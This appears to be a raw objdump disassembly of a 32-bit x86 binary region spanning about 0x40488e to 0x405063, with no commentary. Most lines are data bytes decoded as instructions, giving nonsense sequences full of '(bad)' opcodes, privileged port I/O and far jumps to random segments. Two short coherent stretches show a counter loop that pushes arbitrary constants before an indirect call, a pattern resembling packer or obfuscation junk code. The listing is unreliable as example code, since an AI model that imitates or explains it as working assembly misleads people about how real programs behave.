  40488e:	adc    BYTE PTR [ecx-0x7d99fa69],bl
  404894:	inc    edx
  404895:	icebp  
  404896:	int3   
  404897:	mov    ds:0x440755b6,eax
  40489c:	jnp    0x404876
  40489e:	call   0x4454:0xc8fbda87
  4048a5:	loopne 0x40489b
  4048a7:	popa   
  4048a8:	inc    ebx
  4048a9:	mov    ss,WORD PTR [ecx-0x49466052]
  4048af:	imul   ebp,DWORD PTR [edi-0x78940464],0xfffffff7
  4048b6:	jmp    0xecf0:0xbdcb7c33
  4048bd:	int3   
  4048be:	loopne 0x4048a0
  4048c0:	mov    esp,0xbceaf944
  4048c5:	pushf  
  4048c6:	gs out dx,eax
  4048c8:	jge    0x4048a9
  4048ca:	mov    dh,0x8
  4048cc:	out    dx,eax
  4048cd:	cmp    esi,DWORD PTR [ecx]
  4048cf:	lea    ecx,[edi+eax*8+0x2]
  4048d3:	scas   al,BYTE PTR es:[edi]
  4048d4:	std    
  4048d5:	in     eax,dx
  4048d6:	nop
  4048d7:	lods   al,BYTE PTR ds:[esi]
  4048d8:	inc    edi
  4048d9:	ficom  WORD PTR [ebx+0x4ed2fb32]
  4048df:	add    ebp,edi
  4048e1:	mov    esp,0x866b64e9
  4048e6:	cld    
  4048e7:	dec    ebp
  4048e8:	xchg   edi,eax
  4048e9:	add    dh,ah
  4048eb:	jecxz  0x4048c8
  4048ed:	out    0x23,al
  4048ef:	aas    
  4048f0:	adc    dl,BYTE PTR [si-0x736d]
  4048f5:	sbb    BYTE PTR [esi+0xc6a2b62],al
  4048fb:	stos   DWORD PTR es:[edi],eax
  4048fc:	inc    ebx
  4048fd:	out    0xad,al
  4048ff:	inc    ebp
  404900:	push   es
  404901:	and    BYTE PTR [eax+0x71],ch
  404904:	(bad)  
  404905:	mov    esi,0x9fbf37dd
  40490a:	addr16 (bad) 
  40490c:	loopne 0x40491a
  40490e:	sbb    ch,BYTE PTR [esi]
  404910:	cmp    ebx,DWORD PTR [eax+0x5a]
  404913:	inc    DWORD PTR [edx-0x21cb2d13]
  404919:	stc    
  40491a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40491b:	outs   dx,DWORD PTR es:[esi]
  40491d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40491e:	ins    DWORD PTR es:[edi],dx
  40491f:	stos   DWORD PTR es:[di],eax
  404921:	loopne 0x404949
  404923:	or     BYTE PTR [edi],bl
  404925:	hlt    
  404926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404927:	rol    DWORD PTR [edx-0xe],0x62
  40492b:	push   ds
  40492c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40492d:	shl    DWORD PTR [edx],cl
  40492f:	mov    bl,0x84
  404931:	mov    bh,0x39
  404933:	cwde   
  404934:	lods   eax,DWORD PTR ds:[esi]
  404935:	or     BYTE PTR [eax+0x61f9a7aa],bl
  40493b:	in     eax,0x60
  40493d:	ret    0x3058
  404940:	sahf   
  404941:	fcom   QWORD PTR ds:0xa9553dbf
  404947:	mov    esp,0x76cbbe40
  40494c:	jo     0x404909
  40494e:	stc    
  40494f:	outs   dx,DWORD PTR ds:[esi]
  404950:	push   es
  404951:	push   cs
  404952:	pop    ebx
  404953:	mov    ah,0x37
  404955:	call   0x3c7f:0x64b475d2
  40495c:	add    DWORD PTR [esi+0x1d84fdac],edx
  404962:	je     0x404997
  404964:	int3   
  404965:	popa   
  404966:	lock inc esp
  404968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404969:	in     eax,0x41
  40496b:	adc    ebp,DWORD PTR [ebx-0x73]
  40496e:	push   ebx
  40496f:	cld    
  404970:	imul   esp,DWORD PTR [ecx-0x5b0b6afa],0x1bd04ffb
  40497a:	pop    edx
  40497b:	inc    ebp
  40497c:	mov    ds:0xdd5d56af,eax
  404981:	bound  edx,QWORD PTR [eax]
  404983:	imul   esi,DWORD PTR [ecx-0x3268fcc7],0x2a6e7fdf
  40498d:	xchg   esi,eax
  40498e:	call   DWORD PTR [ecx]
  404990:	mov    esp,eax
  404992:	adc    ebx,esp
  404994:	jo     0x4049ed
  404996:	fcom   DWORD PTR [esi+0x7d]
  404999:	inc    esp
  40499a:	stos   DWORD PTR es:[edi],eax
  40499b:	jb     0x4049d5
  40499d:	mov    edi,0xefd63403
  4049a2:	pop    edx
  4049a3:	sub    al,0xb5
  4049a6:	dec    ebp
  4049a7:	pop    edx
  4049a8:	or     BYTE PTR [eax-0x6962f6ec],bl
  4049ae:	loope  0x40499c
  4049b0:	lahf   
  4049b1:	mov    ebx,0x1adc52b4
  4049b6:	pop    ebp
  4049b7:	sub    ch,BYTE PTR [edx]
  4049b9:	fcmovnb st,st(1)
  4049bb:	in     eax,0x1e
  4049bd:	xchg   esp,eax
  4049be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049bf:	(bad)  
  4049c0:	sar    DWORD PTR [ebx],1
  4049c2:	in     eax,0x2b
  4049c4:	dec    edi
  4049c5:	sbb    dh,BYTE PTR [esi+ebp*2]
  4049c8:	scas   eax,DWORD PTR es:[edi]
  4049c9:	ret    
  4049ca:	xor    ah,bh
  4049cc:	mov    esp,0xc282c068
  4049d1:	rol    BYTE PTR [eax],cl
  4049d3:	cmp    eax,0xd77e069f
  4049d8:	pop    ebp
  4049d9:	mov    WORD PTR [esi-0x19],?
  4049dc:	fiadd  WORD PTR [ecx-0x34]
  4049df:	adc    eax,0x1f775d72
  4049e4:	xor    DWORD PTR [edx+ebp*8+0x910467d],ebx
  4049eb:	and    al,0xae
  4049ed:	idiv   DWORD PTR [ebx+esi*2+0x1983166a]
  4049f4:	push   es
  4049f5:	cmp    DWORD PTR [esi],ecx
  4049f7:	sub    al,BYTE PTR [edi]
  4049f9:	xchg   BYTE PTR [edi],bh
  4049fb:	xor    ecx,ebx
  4049fd:	ss fwait
  4049ff:	inc    esi
  404a00:	fst    QWORD PTR [edi+0x4b2fc64b]
  404a06:	daa    
  404a07:	sbb    BYTE PTR [ecx-0x490c44b7],al
  404a0d:	push   ebx
  404a0e:	neg    BYTE PTR [ebp-0x43]
  404a11:	dec    edi
  404a12:	sub    ch,BYTE PTR [ebx]
  404a14:	cmp    eax,0x67fe3b10
  404a19:	pop    ds
  404a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a1b:	lds    ebp,FWORD PTR [edi+0x342d1f4b]
  404a21:	test   eax,0x8d50be51
  404a26:	dec    edx
  404a27:	daa    
  404a28:	leave  
  404a29:	bound  edx,QWORD PTR [ecx]
  404a2b:	out    dx,al
  404a2c:	or     BYTE PTR [ebx+0x30],bh
  404a2f:	xchg   ebp,eax
  404a30:	sub    dh,ch
  404a32:	push   ss
  404a33:	or     eax,0x945e57b
  404a38:	mov    eax,0xca3e5392
  404a3d:	xor    eax,0x72c4c6a9
  404a42:	fimul  DWORD PTR [eax+0x5d]
  404a45:	pop    esp
  404a46:	push   ds
  404a47:	xchg   esi,eax
  404a48:	or     DWORD PTR [ecx],eax
  404a4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a4b:	adc    edi,ecx
  404a4d:	mov    ecx,0x7510850
  404a52:	and    DWORD PTR ds:0x42a839,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42a839
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42a839,esi
  404a69:	cmp    DWORD PTR ds:0x42a839,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42a839,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42a839
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42a839,esi
  404ab7:	cmp    DWORD PTR ds:0x42a839,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42a7fd
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	and    dl,ah
  404ae4:	dec    edx
  404ae5:	mov    esi,0x78782e46
  404aea:	dec    ebp
  404aeb:	jle    0x404b65
  404aed:	js     0x404ae3
  404aef:	mov    ah,0xf0
  404af1:	in     al,dx
  404af2:	loope  0x404ae0
  404af4:	cmp    bl,al
  404af6:	aaa    
  404af7:	sub    eax,0x71594873
  404afc:	adc    BYTE PTR [esi+esi*4],dl
  404aff:	jmp    DWORD PTR [ebp+0xb]
  404b02:	stc    
  404b03:	xor    ch,BYTE PTR [ebp+0x65]
  404b06:	ins    BYTE PTR es:[edi],dx
  404b07:	pop    eax
  404b08:	or     al,0x90
  404b0a:	dec    edx
  404b0b:	sub    DWORD PTR ds:0x55498497,esp
  404b11:	cdq    
  404b12:	stos   BYTE PTR es:[edi],al
  404b13:	dec    edi
  404b14:	gs loope 0x404b1d
  404b17:	in     eax,0x1e
  404b19:	mov    esp,0x3212995c
  404b1e:	or     eax,0x7b64dcec
  404b23:	rcl    BYTE PTR [ecx+0x105851ea],cl
  404b29:	jle    0x404ada
  404b2b:	lods   eax,DWORD PTR ds:[esi]
  404b2c:	push   ebp
  404b2d:	sbb    eax,0x6421d3fb
  404b32:	adc    BYTE PTR [edx-0x36],bl
  404b35:	sar    BYTE PTR [ecx],cl
  404b37:	mov    ds:0x24613314,eax
  404b3c:	popa   
  404b3d:	out    dx,al
  404b3e:	push   esp
  404b3f:	jl     0x404b86
  404b41:	jg     0x404ba7
  404b43:	mov    ebp,0x9c60a2b4
  404b48:	xor    bl,bh
  404b4a:	and    DWORD PTR [edi+0x9],0x6e
  404b4e:	ror    BYTE PTR [ebx],0xf5
  404b51:	mov    edx,0x8216ea40
  404b56:	arpl   cx,cx
  404b58:	sub    DWORD PTR [ebp+0x7e],0x66
  404b5c:	in     eax,dx
  404b5d:	inc    esi
  404b5e:	mov    dl,0xeb
  404b60:	add    BYTE PTR [esi],ch
  404b62:	dec    esp
  404b63:	mov    al,ds:0xd7e34597
  404b68:	clc    
  404b69:	mov    eax,ds:0xb254fa6e
  404b6e:	mov    cl,0xb
  404b70:	sbb    DWORD PTR [ebx],esp
  404b72:	pop    ss
  404b73:	sbb    DWORD PTR [esi+esi*8],esi
  404b76:	sub    cl,bl
  404b78:	push   edx
  404b79:	cwde   
  404b7a:	push   edi
  404b7b:	(bad)  
  404b7c:	lock add edx,DWORD PTR [ebp+edx*2-0x6f]
  404b81:	out    0x60,al
  404b83:	sub    ebx,ecx
  404b85:	or     dl,al
  404b87:	rcl    edx,1
  404b89:	loope  0x404c00
  404b8b:	cmp    edi,esi
  404b8d:	jecxz  0x404b87
  404b8f:	push   cs
  404b90:	pop    ecx
  404b91:	dec    ebp
  404b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b93:	or     ch,bh
  404b95:	mov    eax,0xa767af68
  404b9a:	mov    bl,0xcb
  404b9c:	addr16 cdq 
  404b9e:	sbb    dl,BYTE PTR [edi-0x5d]
  404ba1:	fs inc ebp
  404ba3:	loop   0x404b50
  404ba5:	stos   DWORD PTR es:[edi],eax
  404ba6:	add    bh,BYTE PTR [ebx+0x494ed745]
  404bac:	and    al,BYTE PTR [edx+0x7e]
  404baf:	xchg   edx,eax
  404bb0:	push   ebx
  404bb1:	iret   
  404bb2:	fs pop ecx
  404bb4:	or     dh,BYTE PTR [ebx-0x4509c49d]
  404bba:	hlt    
  404bbb:	scas   al,BYTE PTR es:[edi]
  404bbc:	repnz push 0xa399b7ec
  404bc2:	or     bh,BYTE PTR [esi+0x632df14c]
  404bc8:	test   BYTE PTR [edx+0x5dd6d46d],al
  404bce:	leave  
  404bcf:	cmp    al,0xcd
  404bd1:	ja     0x404bf0
  404bd3:	fs enter 0x6aa0,0x94
  404bd8:	inc    ebp
  404bd9:	shl    DWORD PTR [ecx],0xac
  404bdc:	loop   0x404c41
  404bde:	add    eax,0x68b6e68a
  404be3:	xchg   ebp,eax
  404be4:	fcomp  QWORD PTR [ebx-0x39]
  404be7:	clc    
  404be8:	cld    
  404be9:	je     0x404bea
  404beb:	in     eax,0x7c
  404bed:	lods   eax,DWORD PTR ds:[esi]
  404bee:	ss and al,0x8f
  404bf1:	or     eax,0x5f22f660
  404bf6:	adc    ecx,esp
  404bf8:	sbb    BYTE PTR [ebx-0x3f],cl
  404bfb:	outs   dx,DWORD PTR ds:[esi]
  404bfc:	popf   
  404bfd:	outs   dx,BYTE PTR ds:[esi]
  404bfe:	adc    DWORD PTR [esi+0xe1b9b0e],edx
  404c04:	sub    esi,eax
  404c06:	adc    bh,BYTE PTR [edi+0x5a560f1a]
  404c0c:	mov    al,ds:0xba3a4c21
  404c11:	push   edx
  404c12:	std    
  404c13:	pop    esi
  404c14:	(bad)  
  404c15:	xor    al,0xf4
  404c17:	or     al,0x9a
  404c19:	adc    eax,0xf10578e2
  404c1e:	sbb    bh,BYTE PTR [esi+ebx*1+0x36]
  404c22:	push   edx
  404c23:	inc    DWORD PTR [esi+0x1a]
  404c26:	push   es
  404c27:	imul   eax,edi,0x3e
  404c2a:	cmp    dh,BYTE PTR [edx+0x18]
  404c2d:	xor    dh,ah
  404c2f:	cmp    BYTE PTR [ecx-0x26],dh
  404c32:	das    
  404c33:	dec    edi
  404c34:	imul   edi,edx,0x6e
  404c37:	loopne 0x404ca9
  404c39:	adc    ebp,DWORD PTR [ebx-0x74fe7672]
  404c3f:	or     al,0xea
  404c41:	mov    ebx,0xdd8c0645
  404c46:	mov    esi,DWORD PTR [ebx]
  404c48:	repz or cl,BYTE PTR [ebx]
  404c4b:	sar    DWORD PTR [edx-0x4acc4961],1
  404c51:	dec    eax
  404c52:	fwait
  404c53:	cvtpi2ps xmm5,QWORD PTR [ecx-0x25]
  404c57:	(bad)  
  404c58:	pop    esp
  404c59:	sahf   
  404c5a:	mov    ?,WORD PTR ds:0x8f24277
  404c60:	xchg   esi,eax
  404c61:	call   0x1a4a0c2d
  404c66:	mov    BYTE PTR [ebp-0x7d],ah
  404c69:	or     eax,0xd836d63a
  404c6e:	scas   al,BYTE PTR es:[edi]
  404c6f:	mov    ds:0x3a9c368f,eax
  404c74:	lahf   
  404c75:	addr16 mov eax,0xcee15783
  404c7b:	fucomip st,st(0)
  404c7d:	mov    ebp,0xa97a5550
  404c82:	mov    dl,0x1d
  404c84:	lds    eax,FWORD PTR ds:0xf6e419c5
  404c8a:	jmp    0x250ba62f
  404c8f:	sbb    DWORD PTR ds:[esi+0x75],edx
  404c93:	cmp    DWORD PTR [esi+0x62],edx
  404c96:	jle    0x404cac
  404c98:	daa    
  404c99:	push   ebp
  404c9a:	sti    
  404c9b:	jg     0x404d03
  404c9d:	inc    edx
  404c9e:	inc    ebp
  404c9f:	test   eax,0xb9267f67
  404ca4:	pop    ss
  404ca5:	mov    eax,ds:0x48d48497
  404caa:	arpl   WORD PTR [eax],dx
  404cac:	sahf   
  404cad:	mov    cl,0x34
  404caf:	jb     0x404cef
  404cb1:	bound  edi,QWORD PTR [ebp+0x12]
  404cb4:	jmp    0x404d03
  404cb6:	test   al,0xfa
  404cb8:	cmp    BYTE PTR ss:[eax],0x76
  404cbc:	aad    0xe3
  404cbe:	arpl   WORD PTR [ebx+0x50abcd63],bp
  404cc4:	push   ss
  404cc5:	mov    ds:0x9ba6e1d9,al
  404cca:	(bad)  
  404ccb:	icebp  
  404ccc:	nop
  404ccd:	mov    ecx,0x500897b2
  404cd2:	inc    esi
  404cd3:	inc    edi
  404cd4:	push   cs
  404cd5:	fs jns 0x404cdc
  404cd8:	stos   DWORD PTR es:[edi],eax
  404cd9:	xlat   BYTE PTR ds:[ebx]
  404cda:	std    
  404cdb:	sahf   
  404cdc:	jmp    0x5bd4:0x3bc6c99f
  404ce3:	lods   eax,DWORD PTR ds:[esi]
  404ce4:	scas   al,BYTE PTR es:[edi]
  404ce5:	cli    
  404ce6:	xor    edi,esp
  404ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ce9:	rcl    BYTE PTR [ecx+0x725e73d4],1
  404cef:	push   ds
  404cf0:	jmp    0x8cf87ac7
  404cf5:	cdq    
  404cf6:	xor    ebp,DWORD PTR [ebx]
  404cf8:	enter  0xcfa0,0xdf
  404cfc:	jo     0x404d6e
  404cfe:	and    eax,0x7a946a23
  404d03:	popa   
  404d04:	sub    DWORD PTR [edi+0x4f8402bb],esi
  404d0a:	pop    esp
  404d0b:	inc    ebp
  404d0c:	cmp    eax,0x184f6844
  404d11:	je     0x404cd1
  404d13:	jecxz  0x404d58
  404d15:	sub    eax,0x2fa97be7
  404d1a:	into   
  404d1b:	xor    BYTE PTR [ecx],dl
  404d1d:	mov    ecx,0xd95fb931
  404d22:	stos   BYTE PTR es:[edi],al
  404d23:	sub    DWORD PTR [ecx-0x782824ab],esi
  404d29:	inc    esp
  404d2a:	dec    eax
  404d2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d2c:	mov    esp,0x198b5c27
  404d31:	cmc    
  404d32:	ins    BYTE PTR es:[edi],dx
  404d33:	in     eax,0x7a
  404d35:	push   edi
  404d36:	clc    
  404d37:	scas   al,BYTE PTR es:[edi]
  404d38:	clc    
  404d39:	gs jmp 0x9f211c1f
  404d3f:	loopne 0x404d34
  404d41:	sahf   
  404d42:	cmp    eax,DWORD PTR [eax-0x415bb137]
  404d48:	in     al,dx
  404d49:	inc    ecx
  404d4a:	dec    ecx
  404d4b:	call   0x9bbe:0xe69edfcf
  404d52:	(bad)  
  404d54:	jecxz  0x404d5f
  404d56:	jae    0x404da0
  404d58:	push   0x6f9b334
  404d5d:	fsubr  DWORD PTR ds:0x4749c015
  404d63:	mov    esi,0xbedd5800
  404d68:	mov    ch,0xfe
  404d6a:	cmp    al,0x8b
  404d6c:	outs   dx,BYTE PTR ds:[esi]
  404d6d:	and    eax,0x332f1ea6
  404d72:	cmp    bl,BYTE PTR ds:0x5456f2e
  404d78:	or     eax,0x96a85c20
  404d7d:	scas   al,BYTE PTR es:[edi]
  404d7e:	loope  0x404d3e
  404d80:	sub    al,BYTE PTR [edi-0x2ce790b5]
  404d86:	mov    BYTE PTR [edx-0x2299cfed],0x5e
  404d8d:	mov    al,0x3d
  404d8f:	and    DWORD PTR ds:0x29a83635,eax
  404d95:	xchg   edi,eax
  404d96:	cdq    
  404d97:	fild   QWORD PTR [ebx]
  404d99:	or     eax,0x325c6454
  404d9e:	inc    ebp
  404d9f:	xlat   BYTE PTR ds:[ebx]
  404da0:	aam    0xf7
  404da2:	aam    0x3b
  404da4:	fimul  WORD PTR [edi-0x2237b1bc]
  404daa:	cmp    al,0xab
  404dac:	pop    eax
  404dad:	xor    BYTE PTR [ebx+edi*8-0x1a8eba82],dh
  404db4:	int3   
  404db5:	dec    edi
  404db6:	mov    dh,0xd0
  404db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404db9:	imul   esp,DWORD PTR [ebp+ebp*4+0x10],0xee05ed4e
  404dc1:	push   edi
  404dc2:	mov    edi,DWORD PTR [ebp+0x10]
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	leave  
  404de9:	aas    
  404dea:	les    esp,FWORD PTR [esi-0x65]
  404ded:	xor    edi,DWORD PTR [eax+0x78]
  404df0:	dec    ebp
  404df1:	jle    0x404e6b
  404df3:	js     0x404e4e
  404df5:	fist   WORD PTR [eax-0x72]
  404df8:	mov    bh,ah
  404dfa:	dec    esi
  404dfb:	xor    al,0xea
  404dfd:	dec    esp
  404dfe:	xor    esp,DWORD PTR [edx+eax*8]
  404e01:	in     al,dx
  404e02:	adc    al,0x56
  404e04:	xor    DWORD PTR [eax],0x8c26a24f
  404e0a:	shl    DWORD PTR [edx+0x27],cl
  404e0d:	push   ds
  404e0e:	dec    eax
  404e0f:	adc    ecx,DWORD PTR [ebx-0xf95fb43]
  404e15:	gs or  eax,0x24913717
  404e1b:	ret    0x1125
  404e1e:	mov    ds:0x3f01357e,eax
  404e23:	sbb    ch,BYTE PTR [esi+0x13178024]
  404e29:	stos   BYTE PTR es:[edi],al
  404e2a:	fimul  DWORD PTR [ebx+ecx*2-0x1296bf5e]
  404e31:	and    DWORD PTR [ebx+eiz*4],eax
  404e34:	jb     0x404e28
  404e36:	rol    DWORD PTR [ecx+ebp*2],1
  404e39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e3a:	fs cdq 
  404e3c:	xchg   esp,eax
  404e3d:	pop    eax
  404e3e:	jae    0x404e53
  404e40:	aaa    
  404e41:	ret    0x1c47
  404e44:	xchg   ecx,eax
  404e45:	dec    ecx
  404e46:	xor    al,0x1e
  404e48:	mov    al,0x8b
  404e4a:	push   0xffffffc5
  404e4c:	add    BYTE PTR [ebp-0x3],bh
  404e4f:	mov    dl,0x2a
  404e51:	xor    eax,0xbcc0f15d
  404e56:	clc    
  404e57:	(bad)  
  404e58:	jae    0x404e6a
  404e5a:	sbb    edi,DWORD PTR [ecx]
  404e5c:	inc    esp
  404e5d:	pop    ds
  404e5e:	cmp    eax,0xefee75c5
  404e63:	or     ebx,edi
  404e65:	(bad)  
  404e66:	mov    ebp,0x4f6fe7f2
  404e6b:	push   0xe3b3e397
  404e70:	sub    al,0xa9
  404e72:	sub    DWORD PTR [eax+0x5137e361],eax
  404e78:	adc    bh,BYTE PTR [ecx]
  404e7a:	add    BYTE PTR [edx],ch
  404e7c:	and    BYTE PTR [edx+0x58],cl
  404e7f:	mov    ah,BYTE PTR [ebx-0x3e155e89]
  404e85:	or     cl,BYTE PTR [edi]
  404e87:	bound  esp,QWORD PTR [edi]
  404e89:	ds xor eax,0xb1252184
  404e8f:	aam    0xfd
  404e91:	fiadd  WORD PTR [edi]
  404e93:	mov    eax,ds:0x38903dd
  404e98:	adc    eax,0x65721270
  404e9d:	call   0x569b:0x22ad288
  404ea4:	pop    es
  404ea5:	xchg   edi,eax
  404ea6:	cmp    BYTE PTR [esi-0x6e],ch
  404ea9:	sbb    DWORD PTR [ebx],edx
  404eab:	lahf   
  404eac:	mov    ?,WORD PTR [eax]
  404eae:	fcmovnb st,st(7)
  404eb0:	stos   DWORD PTR es:[edi],eax
  404eb1:	fiadd  WORD PTR [eax]
  404eb3:	mov    ebx,DWORD PTR [edx]
  404eb5:	les    esp,FWORD PTR [esi+0x12]
  404eb8:	mov    dl,0x77
  404eba:	into   
  404ebb:	(bad)  
  404ebc:	fnstsw WORD PTR [esi+ebx*2]
  404ebf:	xor    al,0x5c
  404ec1:	adc    BYTE PTR ds:0x815d5e99,cl
  404ec7:	sbb    DWORD PTR [ebx-0x7],edx
  404eca:	and    eax,0x4c3984b3
  404ecf:	mov    edi,0xb1b4780d
  404ed4:	dec    esp
  404ed5:	int3   
  404ed6:	jle    0x404f2f
  404ed8:	mov    WORD PTR [ecx+0x1e23aa49],cs
  404ede:	jns    0x404eab
  404ee0:	adc    WORD PTR [eax+0x63],bp
  404ee4:	(bad)  
  404ee6:	into   
  404ee7:	in     al,dx
  404ee8:	xor    DWORD PTR [ecx-0x2a],ebp
  404eeb:	scas   al,BYTE PTR es:[edi]
  404eec:	mov    edi,0x3212d136
  404ef1:	cmc    
  404ef2:	ss pop ecx
  404ef4:	mov    ds:0xfad92d66,eax
  404ef9:	fs pop edi
  404efb:	into   
  404efc:	test   BYTE PTR [eax+0x4e3bfebc],cl
  404f02:	mov    eax,0x4bbf30d1
  404f07:	lods   eax,DWORD PTR ds:[esi]
  404f08:	pop    eax
  404f09:	aam    0x12
  404f0b:	pop    edi
  404f0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f0d:	scas   al,BYTE PTR es:[edi]
  404f0e:	sub    bh,BYTE PTR [edi-0x435fb1dd]
  404f14:	xor    al,BYTE PTR fs:[ebx+0x41]
  404f18:	and    ah,dh
  404f1a:	xchg   DWORD PTR [ebp+0x676d4373],esi
  404f20:	sub    eax,0xab03f8da
  404f25:	push   eax
  404f26:	mov    ecx,0x95a8e553
  404f2b:	cmp    eax,0x8f86b602
  404f30:	inc    ecx
  404f31:	js     0x404fa0
  404f33:	ja     0x404f36
  404f35:	sbb    al,0x40
  404f37:	inc    esi
  404f38:	or     BYTE PTR [ecx+ebx*4-0x44],ah
  404f3c:	pop    ebp
  404f3d:	mov    bl,0x4
  404f3f:	fs retf 0xafdb
  404f43:	pop    ebx
  404f44:	mov    dl,0x1
  404f46:	pusha  
  404f47:	sti    
  404f48:	jecxz  0x404f46
  404f4a:	add    eax,0x72156cd5
  404f4f:	daa    
  404f50:	jmp    0xb2f8:0xec38eb80
  404f57:	es adc edx,esp
  404f5a:	pop    ecx
  404f5b:	push   ss
  404f5c:	rol    cl,0x37
  404f5f:	mov    eax,cr1
  404f62:	push   edx
  404f63:	outs   dx,BYTE PTR ds:[esi]
  404f64:	mov    bl,0xd1
  404f66:	ret    
  404f67:	loopne 0x404f5d
  404f69:	icebp  
  404f6a:	adc    dh,dl
  404f6c:	cmp    ebp,DWORD PTR [ebx+0x1dc45c67]
  404f72:	mov    bl,0x37
  404f74:	mov    ebp,0x75e2ce6a
  404f79:	dec    esi
  404f7a:	in     al,0x2c
  404f7c:	inc    eax
  404f7d:	or     DWORD PTR [esi+0x6a68123b],esi
  404f83:	pop    ebx
  404f84:	mov    edi,DWORD PTR [esi]
  404f86:	or     DWORD PTR [eax+0x9af7c73],eax
  404f8c:	push   es
  404f8d:	xlat   BYTE PTR ds:[ebx]
  404f8e:	sbb    ebp,edi
  404f90:	jb     0x404f7e
  404f92:	inc    eax
  404f93:	in     eax,0x7e
  404f95:	sub    edi,DWORD PTR gs:[edx]
  404f98:	push   es
  404f99:	rol    cl,cl
  404f9b:	push   edi
  404f9c:	or     bl,0x6f
  404f9f:	inc    ebp
  404fa0:	retf   0x9a0c
  404fa3:	icebp  
  404fa4:	xor    ah,dl
  404fa6:	adc    ch,BYTE PTR [edi+edx*4-0x514162e7]
  404fad:	pop    ebp
  404fae:	test   eax,0xb43e8c56
  404fb3:	lods   al,BYTE PTR ds:[esi]
  404fb4:	or     BYTE PTR [ebp+0x66de0fd4],0x7c
  404fbb:	leave  
  404fbc:	pop    ds
  404fbd:	mov    al,ds:0xcfe20429
  404fc2:	inc    esp
  404fc3:	pop    edx
  404fc4:	sub    ax,0x8490
  404fc8:	popf   
  404fc9:	test   dl,al
  404fcb:	jl     0x40500d
  404fcd:	or     edi,DWORD PTR [ebx]
  404fcf:	add    BYTE PTR [eax],al
  404fd1:	push   ebx
  404fd2:	mov    edi,0x2b33058b
  404fd7:	xchg   edi,eax
  404fd8:	inc    edx
  404fd9:	shl    dl,1
  404fdb:	xrelease mov BYTE PTR [ebx],bh
  404fde:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fe0:	xor    DWORD PTR [esi+0x627aa458],0x30
  404fe7:	xchg   ecx,eax
  404fe8:	in     al,0x87
  404fea:	pusha  
  404feb:	xor    ch,BYTE PTR ds:0x1014d56a
  404ff1:	xchg   ebp,eax
  404ff2:	jmp    0x404fbe
  404ff4:	mov    es,WORD PTR [esi]
  404ff6:	push   0xab51bf64
  404ffb:	xor    DWORD PTR [eax],edx
  404ffd:	add    ebp,edi
  404fff:	mov    ch,0xea
  405001:	aad    0x55
  405003:	pop    esp
  405004:	xor    ebp,DWORD PTR [esi+esi*2+0x5cc9e99a]
  40500b:	pop    es
  40500c:	data16 sub BYTE PTR [eax+0x13],ch
  405010:	fs xchg ebx,eax
  405012:	push   cs
  405013:	scas   eax,DWORD PTR es:[edi]
  405014:	fcomp  st(7)
  405016:	inc    esi
  405017:	pop    edx
  405018:	iret   
  405019:	fbstp  TBYTE PTR [edi]
  40501b:	inc    ecx
  40501c:	cli    
  40501d:	push   edi
  40501e:	retf   
  40501f:	shl    DWORD PTR [ecx],0xdc
  405022:	inc    eax
  405023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405024:	mov    bh,0xef
  405026:	mov    ecx,esp
  405028:	sub    DWORD PTR [ecx],edi
  40502a:	mov    DWORD PTR [eax+0xf],edx
  40502d:	xchg   ebx,eax
  40502e:	mov    ah,0xbc
  405030:	add    DWORD PTR ds:0x555a5444,edx
  405036:	mov    dh,0x71
  405038:	xchg   DWORD PTR [esi+0x75040462],eax
  40503e:	push   ebp
  40503f:	and    BYTE PTR [ebx-0x63],dh
  405042:	xlat   BYTE PTR ds:[ebx]
  405043:	inc    edx
  405044:	pusha  
  405045:	mov    bh,0x84
  405047:	add    BYTE PTR [ebp+0x18],al
  40504a:	shl    dl,cl
  40504c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40504d:	lahf   
  40504e:	call   0xf5ebe62b
  405053:	cmc    
  405054:	push   ecx
  405055:	or     al,0x94
  405057:	int3   
  405058:	jno    0x405002
  40505a:	push   eax
  40505b:	sub    DWORD PTR [esi+0x2],esi
  40505e:	out    0x6a,al
  405060:	jnp    0x40507f
  405062:	cld    
  405063:	sar    BYTE PTR [ecx-0x71],0xff
